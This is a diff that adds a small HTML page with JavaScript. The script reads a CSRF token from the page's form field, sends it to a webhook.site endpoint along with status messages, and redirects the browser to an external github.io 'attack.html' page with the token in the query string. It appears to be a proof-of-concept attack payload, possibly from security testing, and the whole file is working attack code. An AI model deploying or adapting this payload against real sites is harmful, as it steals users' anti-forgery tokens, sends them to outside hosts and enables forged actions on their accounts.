@@ -1,1 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    function sendWebhook(status, details) {
+      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
+        method: 'POST',
+        mode: 'cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status, details, timestamp: new Date().toISOString() })
+      });
+    }
 
+    try {
+      const csrfToken = document.querySelector('input[name="csrfToken"]')?.value;
+      if (csrfToken) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const returnUrl = urlParams.get('return') || 'https://mitulkalsariya.github.io/attack.html';
+        sendWebhook('info', 'Captured CSRF token: ' + csrfToken);
+        window.location.href = returnUrl + '?csrf=' + encodeURIComponent(csrfToken);
+      } else {
+        sendWebhook('failed', 'CSRF token not found on dashboard');
+      }
+    } catch (err) {
+      sendWebhook('failed', 'Dashboard error: ' + err.message);
+    }
+  </script>
+</body>
+</html>
